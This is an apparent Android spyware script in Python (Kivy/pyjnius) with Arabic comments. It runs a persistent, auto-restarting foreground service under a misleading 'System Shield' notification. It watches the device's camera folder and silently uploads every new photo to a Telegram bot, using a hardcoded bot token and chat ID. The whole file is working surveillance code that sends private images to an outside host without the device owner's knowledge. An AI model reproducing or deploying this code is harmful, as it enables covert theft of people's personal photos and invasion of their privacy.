import os
import time
import requests
from jnius import autoclass

# --- إعدادات التلجرام ---
TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
CHAT_ID = "-1003535367279"

sent_files = set()

def setup_foreground_service():
    try:
        PythonService = autoclass('org.kivy.android.PythonService')
        service_ctx = PythonService.mService
        
        NotificationManager = autoclass('android.app.NotificationManager')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        Context = autoclass('android.content.Context')
        ServiceInfo = autoclass('android.content.pm.ServiceInfo')
        
        channel_id = 'sh1_ultimate_channel'
        importance = NotificationManager.IMPORTANCE_LOW
        channel = NotificationChannel(channel_id, "Monitor Service", importance)
        nm = service_ctx.getSystemService(Context.NOTIFICATION_SERVICE)
        nm.createNotificationChannel(channel)
        
        notification = NotificationBuilder(service_ctx, channel_id) \
            .setContentTitle("🛡️ System Shield: ACTIVE") \
            .setContentText("المراقبة تعمل بأمان على أحدث إصدارات أندرويد") \
            .setSmallIcon(service_ctx.getApplicationInfo().icon) \
            .setOngoing(True) \
            .build()
            
        service_ctx.setAutoRestartService(True)
        
        # التعديل الحاسم لأندرويد 14 و 15: تمرير نوع الخدمة
        # FOREGROUND_SERVICE_TYPE_DATA_SYNC قيمتها البرمجية 1
        service_ctx.startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        
    except Exception as e:
        print(f"Service Error: {e}")

def monitor_camera():
    path = "/storage/emulated/0/DCIM/Camera"
    known_files = set(os.listdir(path)) if os.path.exists(path) else set()

    while True:
        try:
            if os.path.exists(path):
                current_files = set(os.listdir(path))
                new_files = current_files - known_files - sent_files
                for file in new_files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        sent_files.add(file)
                        full_path = os.path.join(path, file)
                        time.sleep(2) # انتظار استقرار الملف
                        with open(full_path, 'rb') as doc:
                            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", 
                                          data={'chat_id': CHAT_ID, 'caption': f"📄 {file}"},
                                          files={'document': doc}, timeout=30)
                known_files.update(current_files)
        except: pass
        time.sleep(5)

if __name__ == '__main__':
    setup_foreground_service()
    monitor_camera()
